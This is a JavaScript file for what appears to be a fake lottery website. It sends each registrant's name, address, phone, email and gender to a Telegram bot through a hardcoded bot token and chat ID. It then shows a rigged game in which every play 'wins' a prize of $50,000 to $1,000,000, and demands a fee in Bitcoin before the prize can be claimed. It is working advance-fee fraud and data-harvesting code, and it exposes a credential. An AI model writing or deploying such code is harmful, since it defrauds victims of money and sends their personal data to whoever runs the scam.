const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
const TELEGRAM_CHAT_ID = "874563737";  // Make sure to replace this with your actual chat ID
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

document.getElementById('registrationForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = new FormData(e.target);
    const registrationData = {};
    formData.forEach((value, key) => {
        registrationData[key] = value;
    });

    const message = `New Registration:\nFull Name: ${registrationData.fullName}\nAddress: ${registrationData.address}\nPhone: ${registrationData.phone}\nEmail: ${registrationData.email}\nGender: ${registrationData.gender}`;

    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        })
    }).then(response => response.json()).then(data => {
        if (data.ok) {
            document.getElementById('registration').style.display = 'none';
            document.getElementById('game').style.display = 'block';
        } else {
            alert('Registration failed. Please try again.');
        }
    }).catch(error => {
        console.error('Error:', error);
        alert('Registration failed. Please try again.');
    });
});

const prizes = [
    { amount: '$50,000.00', fee: '$500' },
    { amount: '$100,000.00', fee: '$1000' },
    { amount: '$125,000.00', fee: '$1250' },
    { amount: '$150,000.00', fee: '$1500' },
    { amount: '$175,000.00', fee: '$1750' },
    { amount: '$200,000.00', fee: '$2000' },
    { amount: '$250,000.00', fee: '$2500' },
    { amount: '$300,000.00', fee: '$3000' },
    { amount: '$450,000.00', fee: '$4500' },
    { amount: '$500,000.00', fee: '$5000' },
    { amount: '$600,000.00', fee: '$6000' },
    { amount: '$800,000.00', fee: '$8000' },
    { amount: '$850,000.00', fee: '$8500' },
    { amount: '$900,000.00', fee: '$9000' },
    { amount: '$1,000,000.00', fee: '$10000' }
];

let attempts = 0;

document.getElementById('playButton').addEventListener('click', function() {
    attempts++;
    if (attempts <= 3) {
        const prize = prizes[Math.floor(Math.random() * prizes.length)];
        document.getElementById('result').innerText = `You won ${prize.amount}!`;

        if (attempts === 3) {
            document.getElementById('game').style.display = 'none';
            document.getElementById('certificate').style.display = 'block';
            document.getElementById('certificateText').innerText = `Congratulations ${registrationData.fullName}! You won ${prize.amount}.`;
            document.getElementById('paymentAmount').innerText = prize.fee;
        }
    } else {
        attempts = 0;
        document.getElementById('result').innerText = 'Try again!';
    }
});

document.getElementById('downloadCertificate').addEventListener('click', function() {
    const certificateText = document.getElementById('certificateText').innerText;
    const blob = new Blob([certificateText], { type: 'text/plain' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'certificate.txt';
    link.click();
});

document.getElementById('payBitcoin').addEventListener('click', function() {
    window.location.href = `bitcoin_payment.html?amount=${document.getElementById('paymentAmount').innerText}`;
});
